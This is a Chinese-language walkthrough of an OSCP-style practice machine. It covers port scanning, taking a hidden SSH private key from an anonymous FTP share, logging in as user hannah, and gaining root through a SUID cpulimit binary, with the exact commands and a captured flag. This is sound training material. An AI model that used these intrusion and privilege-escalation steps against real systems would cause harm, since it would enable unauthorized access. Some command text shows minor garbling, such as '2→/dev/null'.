# 原创
：  OSCP系列靶场-Esay-1

# OSCP系列靶场-Esay-1

### 总结

`getwebshell` : `ftp`可匿名登录 → 发现隐藏文件夹 → 发现`ssh`密钥 → 猜解`ssh`用户名 → `ssh`密钥登录

`提 权 思 路` : 发现`suid`权限文件 → `cpulimit`提权

### 准备工作

### 信息收集-端口扫描

#### 目标开放端口收集

```
sudo nmap --min-rate 10000 -p- 192.168.179.130

PORT      STATE SERVICE                                      
21/tcp    open  ftp                                          
61000/tcp open  unknown

```

<br/>`开放的端口-→21,61000`

#### 目标端口对应服务探测

```
# tcp探测
sudo nmap -sT -sV -O -sC -p21,61000 192.168.179.130

PORT      STATE SERVICE VERSION                              
21/tcp    open  ftp     vsftpd 3.0.3    
61000/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

```

探测了一下只有`ftp`以及`ssh`两个服务，估计要通过信息进行爆破

### 信息收集-端口测试

#### 21-FTP端口的信息收集

##### 21-FTP版本版本信息

通过`Nmap`探测获得FTP的版本信息，可以大致推测FTP的配置文件位置

```
# 探测版本为vsftpd 3.0.3,配置文件位置大致如下
/etc/vsftpd.conf

```

##### 21-FTP端口匿名登录测试(成功)

尝试匿名账号`anonymous`以及无密码进行登录测试

```
# 利用ftp协议+ip进行连接测试
ftp 192.168.179.130
Name: anonymous

```

##### 21-FTP端口-文件GET收集

登录FTP之后利用`ls`查看存在哪些目录，翻阅的同时查看一下文件权限<br/> 利用`GET`下载文件

```
# binary 以二进制模式传输文件，保证文件完整
ftp → binary
# 查看目录结构
ftp → ls -al
# cd 查看存储的文件
ftp → cd .hannah
ftp → ls -al
# get 下载文件
ftp → get id_rsa

```

##### 21-FTP端口-PUT上传测试(失败)

测试是否可以利用`PUT`上传文件

```
# 建立一个文件尝试上传
touch text.txt
# put 上传文件
ftp → put text.txt

```

### 漏洞利用-getwebshell

得到了一个`id_rsa`不知道是哪个用户的

#### base64解密获取用户名尝试

去掉`id_rsa`文件中的头与尾尝试`base64`解密

<br/> 利用base64进行解密尝试

```
echo 'b3Blbn.....wBAgMEBQ==
' | base64 -d

```

发现没显示全，决定借助网站解密

<br/> 利用在线网站得到的是`root @`#CTL{n}#CTL{n}

#### root用户ssh密钥登录尝试(失败)

获取密钥之后指定密钥进行登录

```
sudo ssh -i id_rsa root @192.168.179.130 -p61000

```

#### 思考

#### 尝试文件名用户

我们现在还有一个信息是之前`ftp`中的`.hannah`的文件名，尝试利用文件名当用户名进行登录

```
# .hannah失败
sudo ssh -i id_rsa .hannah @192.168.179.130 -p61000

```

```
# hannah显示id_rsa开的太大
sudo ssh -i id_rsa .hannah @192.168.179.130 -p61000

```

<br/> 修改`id_rsa`权限后登录成功

```
chmod 600 id_rsa
sudo ssh -i id_rsa .hannah @192.168.179.130 -p61000

```

### 内网遨游-getshell

#### FLAG1获取

```
hannah @ShellDredd:~$ find / -name local.txt 2→/dev/null
/home/hannah/local.txt
hannah @ShellDredd:~$ cat /home/hannah/local.txt
7374ce9b8ccf821ef5d620418751005c

```

#### 信息收集-内网基础信息收集

提权的本质在于`枚举`，在获取shell之后我们要进行内网信息的收集，都是为了`提权`做准备

##### 检测Linux操作系统的发行版本

较老的`Ubuntu`以及Linux系统可以`overlayfs`提权

```
# 确定发行版本
hannah @ShellDredd:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster

```

发行版本为`Debian`，不太能`overlayfs`提权

##### 检测Linux操作系统的内核版本

较低的内核版本可以进行`脏牛`提权

```
hannah @ShellDredd:~$ uname -a
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux

```

内核版本为`4.19.0`

##### 检测当前用户的权限

```
hannah @ShellDredd:~$ id
uid=1000(hannah) gid=1000(hannah) groups=1000(hannah),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)

```

##### 列举出所有的sudo文件

查找具有`sudo`权限，且不需要密码的可提权文件<br/> 如果发现`sudo -l`有东西的话 访问 `https://gtfobins.github.io` 寻找

```
# 利用sudo -l寻找
hannah @ShellDredd:~$ sudo -l
-bash: sudo: command not found

```

发现不存在`sudo`

##### 列举出所有suid文件

如果发现`u=s`有东西的话 访问 `https://gtfobins.github.io` 寻找

```
# -perm 文件权限
hannah @ShellDredd:~$ find / -perm -u=s -type f 2→/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mawk
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/cpulimit
/usr/bin/mount
/usr/bin/passwd

```

#### 权限提升

##### Linux提权-suid之cpulimit提权

搜索`suid`文件权限

<br/> 发现一个不太常见的`cpulimit`，前去搜索`https://gtfobins.github.io`

<br/> 得到提权的命令

```
sudo install -m =xs $(which cpulimit) .
./cpulimit -l 100 -f -- /bin/sh -p

```

```
# 修改一下使用命令进行提权，提权成功
hannah @ShellDredd:~$ cpulimit -l 100 -f -- /bin/sh -p
Process 1145 detected
# whoami
root

```

#### FLAG2获取

```
cat /root/proof.txt

```

完结撒花~

### 总结

`ftp`的时候也要有养成查看是否存在隐藏文件的习惯

每个文件名可能都有寓意，也要进行信息收集与记录

**没看够~？欢迎关注！**
